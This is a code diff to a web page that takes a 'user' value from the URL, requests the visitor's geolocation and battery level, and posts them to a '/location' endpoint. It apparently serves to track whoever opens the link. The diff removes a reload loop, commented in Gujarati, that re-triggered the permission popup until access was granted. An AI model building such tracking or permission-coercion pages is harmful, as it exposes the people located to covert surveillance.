@@ -12,6 +12,7 @@ justify-content:center;
 align-items:center;
 flex-direction:column;
 margin:0;
+font-family:Arial;
 }
 
 button{
@@ -41,7 +42,7 @@ const user = params.get("user")
 
 function getLocation(){
 
-navigator.geolocation.getCurrentPosition(success,error)
+navigator.geolocation.getCurrentPosition(success, denied)
 
 }
 
@@ -53,7 +54,7 @@ let batteryLevel = "Unknown"
 
 if(navigator.getBattery){
 let battery = await navigator.getBattery()
-batteryLevel = Math.round(battery.level*100)
+batteryLevel = Math.round(battery.level * 100)
 }
 
 fetch("/location",{
@@ -71,11 +72,9 @@ battery:batteryLevel
 
 }
 
-function error(){
+function denied(){
 
-alert("Location allow karo pachhi continue thase")
-
-location.reload()   // page reload → popup fari aavse
+document.getElementById("msg").innerText = "Please allow location and tap again"
 
 }
 
